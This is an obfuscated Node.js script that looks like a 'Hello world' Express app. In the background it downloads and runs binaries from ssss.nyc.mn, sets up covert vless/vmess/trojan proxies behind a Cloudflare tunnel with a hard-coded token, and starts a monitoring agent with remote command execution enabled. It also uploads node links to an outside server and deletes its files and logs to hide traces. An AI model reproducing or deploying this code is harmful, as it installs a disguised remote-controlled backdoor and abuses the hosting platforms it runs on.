const _0x42b924=_0x3ef1;(function(_0x3ab5f3,_0x112f62){const _0x36fd69=_0x3ef1,_0x223f10=_0x3ab5f3();while(!![]){try{const _0x44089b=-parseInt(_0x36fd69(0xcf))/0x1+parseInt(_0x36fd69(0xe3))/0x2*(-parseInt(_0x36fd69(0x11e))/0x3)+parseInt(_0x36fd69(0xda))/0x4+parseInt(_0x36fd69(0x121))/0x5*(-parseInt(_0x36fd69(0x13b))/0x6)+parseInt(_0x36fd69(0x133))/0x7+parseInt(_0x36fd69(0xfe))/0x8*(parseInt(_0x36fd69(0x157))/0x9)+-parseInt(_0x36fd69(0xc3))/0xa*(parseInt(_0x36fd69(0xf3))/0xb);if(_0x44089b===_0x112f62)break;else _0x223f10['push'](_0x223f10['shift']());}catch(_0x1b4f8e){_0x223f10['push'](_0x223f10['shift']());}}}(_0x291a,0xeb95c));const express=require(_0x42b924(0x11a)),app=express(),axios=require(_0x42b924(0x110)),os=require('os'),fs=require('fs'),path=require(_0x42b924(0xe5)),{promisify}=require(_0x42b924(0x10f)),exec=promisify(require(_0x42b924(0xa1))['exec']),{execSync}=require(_0x42b924(0xa1)),UPLOAD_URL=process[_0x42b924(0x138)][_0x42b924(0xea)]||'',PROJECT_URL=process[_0x42b924(0x138)][_0x42b924(0xff)]||'',AUTO_ACCESS=process[_0x42b924(0x138)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x42b924(0x138)][_0x42b924(0xd3)]||'./tmp',SUB_PATH=process[_0x42b924(0x138)]['SUB_PATH']||'sub',PORT=process[_0x42b924(0x138)][_0x42b924(0x106)]||process[_0x42b924(0x138)]['PORT']||0xbb8,UUID=process[_0x42b924(0x138)][_0x42b924(0xf8)]||'c6c16505-8568-4c0d-867c-e3a83d709855',NEZHA_SERVER=process['env'][_0x42b924(0x108)]||'',NEZHA_PORT=process['env'][_0x42b924(0xc2)]||'',NEZHA_KEY=process[_0x42b924(0x138)][_0x42b924(0xc0)]||'',ARGO_DOMAIN=process[_0x42b924(0x138)][_0x42b924(0x9d)]||_0x42b924(0x94),ARGO_AUTH=process[_0x42b924(0x138)][_0x42b924(0xbe)]||_0x42b924(0x91),ARGO_PORT=process['env'][_0x42b924(0x99)]||0x1f41,CFIP=process[_0x42b924(0x138)][_0x42b924(0xa8)]||_0x42b924(0xe2),CFPORT=process[_0x42b924(0x138)][_0x42b924(0x117)]||0x1bb,NAME=process[_0x42b924(0x138)]['NAME']||_0x42b924(0xd5);!fs['existsSync'](FILE_PATH)?(fs[_0x42b924(0xbc)](FILE_PATH),console[_0x42b924(0xb6)](FILE_PATH+_0x42b924(0x12a))):console[_0x42b924(0xb6)](FILE_PATH+_0x42b924(0x13a));function generateRandomName(){const _0x148bef=_0x42b924,_0x4362df=_0x148bef(0xdd);let _0x252296='';for(let _0x59c39c=0x0;_0x59c39c<0x6;_0x59c39c++){_0x252296+=_0x4362df['charAt'](Math[_0x148bef(0x127)](Math[_0x148bef(0x116)]()*_0x4362df[_0x148bef(0xd0)]));}return _0x252296;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x42b924(0x107)](FILE_PATH,npmName),phpPath=path[_0x42b924(0x107)](FILE_PATH,phpName),webPath=path[_0x42b924(0x107)](FILE_PATH,webName),botPath=path[_0x42b924(0x107)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x42b924(0x11d)),listPath=path[_0x42b924(0x107)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x42b924(0xad)),configPath=path[_0x42b924(0x107)](FILE_PATH,_0x42b924(0x155));function deleteNodes(){const _0x4e84ab=_0x42b924;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5caa20;try{_0x5caa20=fs[_0x4e84ab(0x148)](subPath,_0x4e84ab(0x13c));}catch{return null;}const _0x4690f2=Buffer['from'](_0x5caa20,_0x4e84ab(0x10e))[_0x4e84ab(0x131)](_0x4e84ab(0x13c)),_0x2d62fd=_0x4690f2[_0x4e84ab(0x14f)]('\x0a')[_0x4e84ab(0xe7)](_0x3aaea4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e84ab(0xc8)](_0x3aaea4));if(_0x2d62fd[_0x4e84ab(0xd0)]===0x0)return;return axios[_0x4e84ab(0x101)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4e84ab(0x14d)]({'nodes':_0x2d62fd}),{'headers':{'Content-Type':_0x4e84ab(0xcb)}})['catch'](_0x5f1470=>{return null;}),null;}catch(_0x4574d5){return null;}}function cleanupOldFiles(){const _0x587dcf=_0x42b924;try{const _0x4c56df=fs['readdirSync'](FILE_PATH);_0x4c56df[_0x587dcf(0x136)](_0x277657=>{const _0x56ec70=_0x587dcf,_0x33dfb8=path[_0x56ec70(0x107)](FILE_PATH,_0x277657);try{const _0xf9a332=fs[_0x56ec70(0xd8)](_0x33dfb8);_0xf9a332[_0x56ec70(0x125)]()&&fs[_0x56ec70(0xd7)](_0x33dfb8);}catch(_0x517da5){}});}catch(_0x1eac88){}}app['get']('/',function(_0x54cfaa,_0x1fbcdd){const _0x1eae9e=_0x42b924;_0x1fbcdd[_0x1eae9e(0x105)]('Hello\x20world!');});async function generateConfig(){const _0x395b6f=_0x42b924,_0x34f44c={'log':{'access':_0x395b6f(0x90),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x395b6f(0xd9),'settings':{'clients':[{'id':UUID,'flow':_0x395b6f(0x144)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x395b6f(0xb5),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x395b6f(0xb9)}},{'port':0xbb9,'listen':_0x395b6f(0xae),'protocol':_0x395b6f(0xd9),'settings':{'clients':[{'id':UUID}],'decryption':_0x395b6f(0xa5)},'streamSettings':{'network':_0x395b6f(0xb9),'security':_0x395b6f(0xa5)}},{'port':0xbba,'listen':_0x395b6f(0xae),'protocol':_0x395b6f(0xd9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x395b6f(0xa5)},'streamSettings':{'network':'ws','security':_0x395b6f(0xa5),'wsSettings':{'path':_0x395b6f(0x10a)}},'sniffing':{'enabled':!![],'destOverride':[_0x395b6f(0x10b),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x395b6f(0xae),'protocol':_0x395b6f(0x102),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x395b6f(0xb5)}},'sniffing':{'enabled':!![],'destOverride':[_0x395b6f(0x10b),_0x395b6f(0x12e),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x395b6f(0xae),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x395b6f(0xa5),'wsSettings':{'path':_0x395b6f(0x124)}},'sniffing':{'enabled':!![],'destOverride':[_0x395b6f(0x10b),'tls',_0x395b6f(0x97)],'metadataOnly':![]}}],'dns':{'servers':[_0x395b6f(0xee)]},'outbounds':[{'protocol':_0x395b6f(0xef),'tag':_0x395b6f(0xd4)},{'protocol':_0x395b6f(0x119),'tag':_0x395b6f(0xc6)}]};fs[_0x395b6f(0xac)](path[_0x395b6f(0x107)](FILE_PATH,_0x395b6f(0x155)),JSON[_0x395b6f(0x14d)](_0x34f44c,null,0x2));}function getSystemArchitecture(){const _0xbad8ac=_0x42b924,_0x30b0f3=os[_0xbad8ac(0x152)]();return _0x30b0f3==='arm'||_0x30b0f3==='arm64'||_0x30b0f3==='aarch64'?'arm':_0xbad8ac(0x10c);}function downloadFile(_0x50234c,_0x16db08,_0x1e0b60){const _0x5bc88c=_0x42b924,_0xa57e02=_0x50234c;!fs[_0x5bc88c(0x137)](FILE_PATH)&&fs[_0x5bc88c(0xbc)](FILE_PATH,{'recursive':!![]});const _0x547cbc=fs[_0x5bc88c(0x118)](_0xa57e02);axios({'method':_0x5bc88c(0xed),'url':_0x16db08,'responseType':_0x5bc88c(0xf6)})[_0x5bc88c(0x145)](_0x25eed0=>{const _0x1640cf=_0x5bc88c;_0x25eed0['data']['pipe'](_0x547cbc),_0x547cbc['on'](_0x1640cf(0x14e),()=>{const _0x4e1168=_0x1640cf;_0x547cbc['close'](),console[_0x4e1168(0xb6)](_0x4e1168(0xd6)+path['basename'](_0xa57e02)+_0x4e1168(0xaf)),_0x1e0b60(null,_0xa57e02);}),_0x547cbc['on'](_0x1640cf(0x115),_0x2287ce=>{const _0x948109=_0x1640cf;fs[_0x948109(0x151)](_0xa57e02,()=>{});const _0x3fc76d=_0x948109(0xd6)+path[_0x948109(0x134)](_0xa57e02)+_0x948109(0xab)+_0x2287ce[_0x948109(0x123)];console[_0x948109(0x115)](_0x3fc76d),_0x1e0b60(_0x3fc76d);});})[_0x5bc88c(0x9b)](_0x4999c5=>{const _0x30b657=_0x5bc88c,_0x5ab170=_0x30b657(0xd6)+path[_0x30b657(0x134)](_0xa57e02)+_0x30b657(0xab)+_0x4999c5['message'];console[_0x30b657(0x115)](_0x5ab170),_0x1e0b60(_0x5ab170);});}async function downloadFilesAndRun(){const _0x51ee80=_0x42b924,_0x5c50fb=getSystemArchitecture(),_0x279aa5=getFilesForArchitecture(_0x5c50fb);if(_0x279aa5[_0x51ee80(0xd0)]===0x0){console[_0x51ee80(0xb6)](_0x51ee80(0xec));return;}const _0xc91c81=_0x279aa5['map'](_0xa67678=>{return new Promise((_0x381918,_0x4d4e32)=>{const _0x22eeed=_0x3ef1;downloadFile(_0xa67678[_0x22eeed(0xaa)],_0xa67678[_0x22eeed(0xa9)],(_0x3ee7b6,_0x4c58fa)=>{_0x3ee7b6?_0x4d4e32(_0x3ee7b6):_0x381918(_0x4c58fa);});});});try{await Promise[_0x51ee80(0xdf)](_0xc91c81);}catch(_0x47655a){console[_0x51ee80(0x115)](_0x51ee80(0x149),_0x47655a);return;}function _0x32174f(_0x3cf1c7){const _0x3c4491=0x1fd;_0x3cf1c7['forEach'](_0x3b4878=>{const _0x4a28cd=_0x3ef1;fs[_0x4a28cd(0x137)](_0x3b4878)&&fs[_0x4a28cd(0x129)](_0x3b4878,_0x3c4491,_0x4ebc67=>{const _0x2af07c=_0x4a28cd;_0x4ebc67?console['error'](_0x2af07c(0x12f)+_0x3b4878+':\x20'+_0x4ebc67):console['log'](_0x2af07c(0x154)+_0x3b4878+':\x20'+_0x3c4491[_0x2af07c(0x131)](0x8));});});}const _0x323610=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x32174f(_0x323610);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4c4a36=NEZHA_SERVER[_0x51ee80(0xbb)](':')?NEZHA_SERVER[_0x51ee80(0x14f)](':')[_0x51ee80(0xf4)]():'',_0x19216f=new Set(['443',_0x51ee80(0x100),_0x51ee80(0xdb),_0x51ee80(0x140),_0x51ee80(0x153),_0x51ee80(0xb7)]),_0x4d03e9=_0x19216f[_0x51ee80(0x111)](_0x4c4a36)?_0x51ee80(0x104):_0x51ee80(0x11b),_0x57b3c0=_0x51ee80(0xf5)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x51ee80(0xfb)+_0x4d03e9+_0x51ee80(0xe0)+UUID;fs[_0x51ee80(0xac)](path[_0x51ee80(0x107)](FILE_PATH,_0x51ee80(0xbf)),_0x57b3c0);const _0x4e007f=_0x51ee80(0x12c)+phpPath+_0x51ee80(0xf9)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4e007f),console[_0x51ee80(0xb6)](phpName+'\x20is\x20running'),await new Promise(_0x4621f9=>setTimeout(_0x4621f9,0x3e8));}catch(_0x355888){console[_0x51ee80(0x115)]('php\x20running\x20error:\x20'+_0x355888);}}else{let _0x5e79c7='';const _0x2b8a57=[_0x51ee80(0xc5),_0x51ee80(0x100),_0x51ee80(0xdb),_0x51ee80(0x140),_0x51ee80(0x153),'2053'];_0x2b8a57[_0x51ee80(0xbb)](NEZHA_PORT)&&(_0x5e79c7=_0x51ee80(0x9c));const _0x4d999b=_0x51ee80(0x12c)+npmPath+_0x51ee80(0xb8)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5e79c7+_0x51ee80(0xb4);try{await exec(_0x4d999b),console['log'](npmName+_0x51ee80(0xc9)),await new Promise(_0x5ead98=>setTimeout(_0x5ead98,0x3e8));}catch(_0x42ea9b){console[_0x51ee80(0x115)](_0x51ee80(0x141)+_0x42ea9b);}}}else console[_0x51ee80(0xb6)](_0x51ee80(0xdc));const _0x1eb4b7=_0x51ee80(0x12c)+webPath+_0x51ee80(0x103)+FILE_PATH+_0x51ee80(0x13e);try{await exec(_0x1eb4b7),console[_0x51ee80(0xb6)](webName+_0x51ee80(0xc9)),await new Promise(_0x519597=>setTimeout(_0x519597,0x3e8));}catch(_0x58d392){console['error'](_0x51ee80(0xe8)+_0x58d392);}if(fs[_0x51ee80(0x137)](botPath)){let _0x2ecaf9;if(ARGO_AUTH[_0x51ee80(0x150)](/^[A-Z0-9a-z=]{120,250}$/))_0x2ecaf9=_0x51ee80(0x13f)+ARGO_AUTH;else ARGO_AUTH[_0x51ee80(0x150)](/TunnelSecret/)?_0x2ecaf9=_0x51ee80(0xc4)+FILE_PATH+'/tunnel.yml\x20run':_0x2ecaf9=_0x51ee80(0x126)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x51ee80(0x12c)+botPath+'\x20'+_0x2ecaf9+_0x51ee80(0x109)),console[_0x51ee80(0xb6)](botName+'\x20is\x20running'),await new Promise(_0x22f839=>setTimeout(_0x22f839,0x7d0));}catch(_0x48cb24){console[_0x51ee80(0x115)]('Error\x20executing\x20command:\x20'+_0x48cb24);}}await new Promise(_0xb54a28=>setTimeout(_0xb54a28,0x1388));}function getFilesForArchitecture(_0x1e66df){const _0x59b829=_0x42b924;let _0x5aba5b;_0x1e66df==='arm'?_0x5aba5b=[{'fileName':webPath,'fileUrl':_0x59b829(0xe4)},{'fileName':botPath,'fileUrl':_0x59b829(0xb0)}]:_0x5aba5b=[{'fileName':webPath,'fileUrl':_0x59b829(0xd1)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5cdb7e=_0x1e66df===_0x59b829(0x11f)?_0x59b829(0xa0):'https://amd64.ssss.nyc.mn/agent';_0x5aba5b[_0x59b829(0xe9)]({'fileName':npmPath,'fileUrl':_0x5cdb7e});}else{const _0x469805=_0x1e66df==='arm'?_0x59b829(0x156):'https://amd64.ssss.nyc.mn/v1';_0x5aba5b[_0x59b829(0xe9)]({'fileName':phpPath,'fileUrl':_0x469805});}}return _0x5aba5b;}function _0x291a(){const _0xce262b=['\x20successfully','https://arm64.ssss.nyc.mn/bot','?security=tls&sni=','taskkill\x20/f\x20/im\x20','/api/add-nodes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/vmess-argo','log','2053','\x20-s\x20','tcp','\x0a\x20\x20\x20\x20','includes','mkdirSync','ARGO_DOMAIN:','ARGO_AUTH','config.yaml','NEZHA_KEY','set','NEZHA_PORT','2154830bnQFrE','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','443','block','\x22\x20>\x20/dev/null\x202>&1','test','\x20is\x20running','status','application/json','firefox','Unhandled\x20error\x20in\x20startserver:','data','1601714gFyPcj','length','https://amd64.ssss.nyc.mn/web','response','FILE_PATH','direct','lgzy','Download\x20','unlinkSync','statSync','vless','6735568vOrmMH','2096','NEZHA\x20variable\x20is\x20empty,skip\x20running','abcdefghijklmnopqrstuvwxyz','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','all','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','cdns.doon.eu.org','2JArvNZ','https://arm64.ssss.nyc.mn/web','path','pkill\x20-f\x20\x22[','filter','web\x20running\x20error:\x20','unshift','UPLOAD_URL','tunnel.json','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','get','https+local://8.8.8.8/dns-query','freedom','Error\x20in\x20startserver:','country_code','charAt','33wPbBOd','pop','\x0aclient_secret:\x20','stream','platform','UUID','\x20-c\x20\x22','Error\x20executing\x20command:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20>\x20nul\x202>&1','win32','608knBXDY','PROJECT_URL','8443','post','vmess','\x20-c\x20','true','send','SERVER_PORT','join','NEZHA_SERVER','\x20>/dev/null\x202>&1\x20&','/vless-argo','http','amd','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','base64','util','axios','has','Error\x20reading\x20boot.log:','org','App\x20is\x20running','error','random','CFPORT','createWriteStream','blackhole','express','false','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','sub.txt','2026737YvtjXj','arm','http://ip-api.com/json/','5LCGXPL','push','message','/trojan-argo','isFile','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','floor','/sub.txt\x20saved\x20successfully','chmod','\x20is\x20created','rm\x20-rf\x20','nohup\x20','countryCode','tls','Empowerment\x20failed\x20for\x20','\x0a\x20\x20tunnel:\x20','toString','del\x20/f\x20/q\x20','11884971ITCYnu','basename','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','forEach','existsSync','env','\x0a\x20\x20credentials-file:\x20','\x20already\x20exists','3034938JshYqW','utf-8','TunnelSecret','/config.json\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2087','npm\x20running\x20error:\x20','\x0a\x0avmess://','tunnel.yml','xtls-rprx-vision','then','https://ipapi.co/json/','text/plain;\x20charset=utf-8','readFileSync','Error\x20downloading\x20files:','/vmess-argo?ed=2560','from','/api/add-subscriptions','stringify','finish','split','match','unlink','arch','2083','Empowerment\x20success\x20for\x20','config.json','https://arm64.ssss.nyc.mn/v1','119934wcJDca','/dev/null','eyJhIjoiZmEyOWFkMDQ0OTIzZjY3ZWIyNjg1ZGQ5MTkyMDAyMjIiLCJ0IjoiZDk3Mzg1MjctN2VhNi00OTk4LTk3ZjMtMmU5ZWFlODc3MGU3IiwicyI6Ik5tWXhOemcyWXpjdFlUUmlNeTAwWVRRNUxXRmhZamt0WXpneU0yUXpZemhoT0dWayJ9','Content-Type','http\x20server\x20is\x20running\x20on\x20port:','77.88.c.3.3.0.7.0.f.1.0.7.4.0.1.0.0.2.ip6.arpa','?encryption=none&security=tls&sni=','Unknown','quic','.exe\x20>\x20nul\x202>&1','ARGO_PORT','Nodes\x20uploaded\x20successfully','catch','--tls','ARGO_DOMAIN','\x0a\x0atrojan://','\x0avless://','https://arm64.ssss.nyc.mn/agent','child_process','\x20>/dev/null\x202>&1','success','Subscription\x20uploaded\x20successfully','none','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','CFIP','fileUrl','fileName','\x20failed:\x20','writeFileSync','boot.log','127.0.0.1'];_0x291a=function(){return _0xce262b;};return _0x291a();}function argoType(){const _0x4ec325=_0x42b924;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4ec325(0x11c));return;}if(ARGO_AUTH['includes'](_0x4ec325(0x13d))){fs[_0x4ec325(0xac)](path['join'](FILE_PATH,_0x4ec325(0xeb)),ARGO_AUTH);const _0x4413b0=_0x4ec325(0x130)+ARGO_AUTH['split']('\x22')[0xb]+_0x4ec325(0x139)+path[_0x4ec325(0x107)](FILE_PATH,_0x4ec325(0xeb))+_0x4ec325(0xe1)+ARGO_DOMAIN+_0x4ec325(0x135)+ARGO_PORT+_0x4ec325(0x10d);fs[_0x4ec325(0xac)](path[_0x4ec325(0x107)](FILE_PATH,_0x4ec325(0x143)),_0x4413b0);}else console[_0x4ec325(0xb6)](_0x4ec325(0xa7));}function _0x3ef1(_0x441fc6,_0x1a62bb){_0x441fc6=_0x441fc6-0x90;const _0x291af1=_0x291a();let _0x3ef1ea=_0x291af1[_0x441fc6];return _0x3ef1ea;}async function extractDomains(){const _0x11394b=_0x42b924;let _0x5bb253;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5bb253=ARGO_DOMAIN,console[_0x11394b(0xb6)](_0x11394b(0xbd),_0x5bb253),await _0x135b1e(_0x5bb253);else try{const _0x277c5c=fs[_0x11394b(0x148)](path[_0x11394b(0x107)](FILE_PATH,_0x11394b(0xad)),_0x11394b(0x13c)),_0x1ace21=_0x277c5c['split']('\x0a'),_0x46faa1=[];_0x1ace21[_0x11394b(0x136)](_0x124a3c=>{const _0x16c43e=_0x11394b,_0x24745b=_0x124a3c[_0x16c43e(0x150)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x24745b){const _0x46e64b=_0x24745b[0x1];_0x46faa1[_0x16c43e(0x122)](_0x46e64b);}});if(_0x46faa1[_0x11394b(0xd0)]>0x0)_0x5bb253=_0x46faa1[0x0],console['log']('ArgoDomain:',_0x5bb253),await _0x135b1e(_0x5bb253);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x11394b(0xd7)](path[_0x11394b(0x107)](FILE_PATH,_0x11394b(0xad)));async function _0x306257(){const _0x3bba6c=_0x11394b;try{process[_0x3bba6c(0xf7)]===_0x3bba6c(0xfd)?await exec(_0x3bba6c(0xb2)+botName+_0x3bba6c(0x98)):await exec(_0x3bba6c(0xe6)+botName[_0x3bba6c(0xf2)](0x0)+']'+botName['substring'](0x1)+_0x3bba6c(0xc7));}catch(_0x580d98){}}_0x306257(),await new Promise(_0x4ff79c=>setTimeout(_0x4ff79c,0xbb8));const _0x1b5599=_0x11394b(0x126)+FILE_PATH+_0x11394b(0xde)+ARGO_PORT;try{await exec(_0x11394b(0x12c)+botPath+'\x20'+_0x1b5599+_0x11394b(0x109)),console[_0x11394b(0xb6)](botName+_0x11394b(0xc9)),await new Promise(_0x157f87=>setTimeout(_0x157f87,0xbb8)),await extractDomains();}catch(_0x5e8f3f){console[_0x11394b(0x115)](_0x11394b(0xfa)+_0x5e8f3f);}}}catch(_0x235fd2){console['error'](_0x11394b(0x112),_0x235fd2);}async function _0x335f59(){const _0x5d417e=_0x11394b;try{const _0x19f0b4=await axios['get'](_0x5d417e(0x146),{'timeout':0xbb8});if(_0x19f0b4['data']&&_0x19f0b4[_0x5d417e(0xce)]['country_code']&&_0x19f0b4[_0x5d417e(0xce)][_0x5d417e(0x113)])return _0x19f0b4['data'][_0x5d417e(0xf1)]+'_'+_0x19f0b4[_0x5d417e(0xce)][_0x5d417e(0x113)];}catch(_0x5d07f7){try{const _0x11ac60=await axios[_0x5d417e(0xed)](_0x5d417e(0x120),{'timeout':0xbb8});if(_0x11ac60[_0x5d417e(0xce)]&&_0x11ac60[_0x5d417e(0xce)][_0x5d417e(0xca)]===_0x5d417e(0xa3)&&_0x11ac60[_0x5d417e(0xce)][_0x5d417e(0x12d)]&&_0x11ac60['data']['org'])return _0x11ac60['data'][_0x5d417e(0x12d)]+'_'+_0x11ac60['data'][_0x5d417e(0x113)];}catch(_0x3dba1c){}}return _0x5d417e(0x96);}async function _0x135b1e(_0x5c0977){const _0x3c794e=await _0x335f59(),_0x1baa74=NAME?NAME+'-'+_0x3c794e:_0x3c794e;return new Promise(_0x4d5365=>{setTimeout(()=>{const _0x4acdd9=_0x3ef1,_0x16a651={'v':'2','ps':''+_0x1baa74,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4acdd9(0xa5),'net':'ws','type':_0x4acdd9(0xa5),'host':_0x5c0977,'path':_0x4acdd9(0x14a),'tls':_0x4acdd9(0x12e),'sni':_0x5c0977,'alpn':'','fp':_0x4acdd9(0xcc)},_0x1d1f42=_0x4acdd9(0x9f)+UUID+'@'+CFIP+':'+CFPORT+_0x4acdd9(0x95)+_0x5c0977+'&fp=firefox&type=ws&host='+_0x5c0977+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1baa74+_0x4acdd9(0x142)+Buffer[_0x4acdd9(0x14b)](JSON[_0x4acdd9(0x14d)](_0x16a651))['toString'](_0x4acdd9(0x10e))+_0x4acdd9(0x9e)+UUID+'@'+CFIP+':'+CFPORT+_0x4acdd9(0xb1)+_0x5c0977+'&fp=firefox&type=ws&host='+_0x5c0977+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1baa74+_0x4acdd9(0xba);console[_0x4acdd9(0xb6)](Buffer[_0x4acdd9(0x14b)](_0x1d1f42)[_0x4acdd9(0x131)](_0x4acdd9(0x10e))),fs[_0x4acdd9(0xac)](subPath,Buffer[_0x4acdd9(0x14b)](_0x1d1f42)['toString'](_0x4acdd9(0x10e))),console[_0x4acdd9(0xb6)](FILE_PATH+_0x4acdd9(0x128)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x120cce,_0x27688a)=>{const _0x2decc5=_0x4acdd9,_0x93470d=Buffer['from'](_0x1d1f42)['toString'](_0x2decc5(0x10e));_0x27688a[_0x2decc5(0xc1)](_0x2decc5(0x92),_0x2decc5(0x147)),_0x27688a['send'](_0x93470d);}),_0x4d5365(_0x1d1f42);},0x7d0);});}}async function uploadNodes(){const _0x150edf=_0x42b924;if(UPLOAD_URL&&PROJECT_URL){const _0x4d114e=PROJECT_URL+'/'+SUB_PATH,_0x4aa0a0={'subscription':[_0x4d114e]};try{const _0x5189f7=await axios[_0x150edf(0x101)](UPLOAD_URL+_0x150edf(0x14c),_0x4aa0a0,{'headers':{'Content-Type':_0x150edf(0xcb)}});return _0x5189f7&&_0x5189f7['status']===0xc8?(console['log'](_0x150edf(0xa4)),_0x5189f7):null;}catch(_0x472245){if(_0x472245[_0x150edf(0xd2)]){if(_0x472245[_0x150edf(0xd2)][_0x150edf(0xca)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x150edf(0x137)](listPath))return;const _0x9d8d33=fs[_0x150edf(0x148)](listPath,'utf-8'),_0x24458c=_0x9d8d33[_0x150edf(0x14f)]('\x0a')[_0x150edf(0xe7)](_0x1155ed=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x150edf(0xc8)](_0x1155ed));if(_0x24458c['length']===0x0)return;const _0x16e47b=JSON[_0x150edf(0x14d)]({'nodes':_0x24458c});try{const _0x220966=await axios[_0x150edf(0x101)](UPLOAD_URL+_0x150edf(0xb3),_0x16e47b,{'headers':{'Content-Type':_0x150edf(0xcb)}});return _0x220966&&_0x220966[_0x150edf(0xca)]===0xc8?(console[_0x150edf(0xb6)](_0x150edf(0x9a)),_0x220966):null;}catch(_0x2f5862){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x24e717=_0x3ef1,_0x200349=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x200349[_0x24e717(0x122)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x200349[_0x24e717(0x122)](phpPath);process[_0x24e717(0xf7)]===_0x24e717(0xfd)?exec(_0x24e717(0x132)+_0x200349[_0x24e717(0x107)]('\x20')+_0x24e717(0xfc),_0x577a57=>{console['clear'](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x24e717(0x12b)+_0x200349['join']('\x20')+_0x24e717(0xa2),_0x344c3c=>{const _0x487fcf=_0x24e717;console['clear'](),console['log'](_0x487fcf(0x114)),console[_0x487fcf(0xb6)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xcd80c5=_0x42b924;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xcd80c5(0xb6)](_0xcd80c5(0xa6));return;}try{const _0x2a0a58=await axios[_0xcd80c5(0x101)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xcd80c5(0xcb)}});return console[_0xcd80c5(0xb6)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2a0a58;}catch(_0x37b61f){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x37b61f['message']),null;}}async function startserver(){const _0x58fd30=_0x42b924;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x28dcf6){console[_0x58fd30(0x115)](_0x58fd30(0xf0),_0x28dcf6);}}startserver()[_0x42b924(0x9b)](_0x3011d2=>{const _0x407c79=_0x42b924;console[_0x407c79(0x115)](_0x407c79(0xcd),_0x3011d2);}),app['listen'](PORT,()=>console['log'](_0x42b924(0x93)+PORT+'!'));
